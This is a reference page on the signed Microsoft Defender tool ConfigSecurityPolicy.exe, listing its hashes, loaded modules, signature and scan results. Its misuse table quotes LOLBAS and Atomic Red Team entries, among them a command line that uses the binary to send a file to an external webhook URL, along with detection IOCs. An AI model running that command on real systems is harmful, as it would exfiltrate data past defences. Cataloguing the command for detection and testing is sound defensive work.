---
title: ConfigSecurityPolicy.exe | Microsoft Security Client Policy Configuration Tool
excerpt: What is ConfigSecurityPolicy.exe?
---

# ConfigSecurityPolicy.exe 

* File Path: `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2007.8-0\ConfigSecurityPolicy.exe`
* Description: Microsoft Security Client Policy Configuration Tool

## Hashes

Type | Hash
-- | --
MD5 | `B5A3A34619717DB8486BCD0EE10D8791`
SHA1 | `386A0B9561B2B5C63D07A15900B23BA41339112C`
SHA256 | `6D9589A6DB768B9EB658215059B9848B9DE96DD8EA701BE8A11F28E062684E20`
SHA384 | `87864E07B5CB2C789C6E5B5854C3CC30AA6CAA87C931BF37358C0D5E11747540620E82EAA4D3941871B1B15A1529DDF6`
SHA512 | `7DA1AB11FB77FE3F5A2269C0DCD3DF50DB7DB400CD2F3F3948C31C2688F7446C9ED783D6FF43317D583E0559871EB31D1D5E87FB100EDF026979BEED8003D243`
SSDEEP | `3072:Kns2yL/4Vn+mFSGaToJqOMa1LFLK2gg6cEADk74t+fXa/QwKeGiSMV+T8rguIcmX:+s204t+cyoJ5M8LB3iqnXrgimGbw3`
IMP | `C87FC829E4403CB94530225A7ADC688A`
PESHA1 | `D43B3033E281B2C2F061959FDB6C0487FE885724`
PE256 | `E2078CBD9582436DEE41FAF4069E24DA4F950AD6C65B14E42D4FDFECC3B1A119`

## Runtime Data

### Usage (stderr):
```cmhg
Microsoft Security Client failed to apply policy "--help". Error code: 0xC00CE225.

```

### Loaded Modules:

Path |
-- |
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2007.8-0\ConfigSecurityPolicy.exe |
C:\Windows\System32\ADVAPI32.dll |
C:\Windows\System32\bcrypt.dll |
C:\Windows\System32\bcryptPrimitives.dll |
C:\Windows\System32\cfgmgr32.dll |
C:\Windows\System32\clbcatq.dll |
C:\Windows\System32\combase.dll |
C:\Windows\System32\CRYPT32.dll |
C:\Windows\SYSTEM32\CRYPTBASE.dll |
C:\Windows\System32\cryptsp.dll |
C:\Windows\System32\GDI32.dll |
C:\Windows\System32\gdi32full.dll |
C:\Windows\SYSTEM32\gpapi.dll |
C:\Windows\System32\imagehlp.dll |
C:\Windows\System32\IMM32.DLL |
C:\Windows\System32\kernel.appcore.dll |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\System32\MSASN1.dll |
C:\Windows\System32\msvcp_win.dll |
C:\Windows\System32\msvcrt.dll |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\ole32.dll |
C:\Windows\System32\OLEAUT32.dll |
C:\Windows\System32\powrprof.dll |
C:\Windows\System32\profapi.dll |
C:\Windows\System32\RPCRT4.dll |
C:\Windows\system32\rsaenh.dll |
C:\Windows\System32\sechost.dll |
C:\Windows\System32\shcore.dll |
C:\Windows\System32\SHELL32.dll |
C:\Windows\System32\shlwapi.dll |
C:\Windows\System32\ucrtbase.dll |
C:\Windows\System32\USER32.dll |
C:\Windows\SYSTEM32\USERENV.dll |
C:\Windows\system32\uxtheme.dll |
C:\Windows\System32\win32u.dll |
C:\Windows\System32\windows.storage.dll |
C:\Windows\System32\WINTRUST.dll |
C:\Windows\SYSTEM32\WTSAPI32.dll |


## Signature

* Status: Signature verified.
* Serial: `33000001C422B2F79B793DACB20000000001C4`
* Thumbprint: `AE9C1AE54763822EEC42474983D8B635116C8452`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: ConfigSecurityPolicy.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 4.18.17763.1 (WinBuild.160101.0800)
* Product Version: 4.18.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/70
* VirusTotal Link: https://www.virustotal.com/gui/file/6d9589a6db768b9eb658215059b9848b9de96dd8ea701be8a11f28e062684e20/detection/

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe](ConfigSecurityPolicy.exe-B5A3A34619717DB8486BCD0EE10D8791.md) | 100
[C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2004.6-0\ConfigSecurityPolicy.exe](ConfigSecurityPolicy.exe-B5A3A34619717DB8486BCD0EE10D8791.md) | 100
[C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2005.5-0\ConfigSecurityPolicy.exe](ConfigSecurityPolicy.exe-B5A3A34619717DB8486BCD0EE10D8791.md) | 100
[C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2006.10-0\ConfigSecurityPolicy.exe](ConfigSecurityPolicy.exe-B5A3A34619717DB8486BCD0EE10D8791.md) | 100
[C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe](ConfigSecurityPolicy.exe-B5A3A34619717DB8486BCD0EE10D8791.md) | 100
[C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2009.7-0\ConfigSecurityPolicy.exe](ConfigSecurityPolicy.exe-B5A3A34619717DB8486BCD0EE10D8791.md) | 100

## Possible Misuse

*The following table contains possible examples of `ConfigSecurityPolicy.exe` being misused. While `ConfigSecurityPolicy.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `Name: ConfigSecurityPolicy.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- Command: ConfigSecurityPolicy.exe C:\\Windows\\System32\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- IOC: ConfigSecurityPolicy storing data into alternate data streams.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- IOC: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [ConfigSecurityPolicy.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml) | `- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe.`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: Data Exfiltration with ConfigSecurityPolicy [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: Data Exfiltration with ConfigSecurityPolicy [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1567.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567/T1567.md) | - [Atomic Test #1 - Data Exfiltration with ConfigSecurityPolicy](#atomic-test-1---data-exfiltration-with-configsecuritypolicy) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1567.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567/T1567.md) | ## Atomic Test #1 - Data Exfiltration with ConfigSecurityPolicy | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1567.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567/T1567.md) | Exfiltration of data using ConfigSecurityPolicy.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1567.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567/T1567.md) | $path = resolve-path "c:\ProgramData\Microsoft\Windows Defender\Platform\*\ConfigSecurityPolicy.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


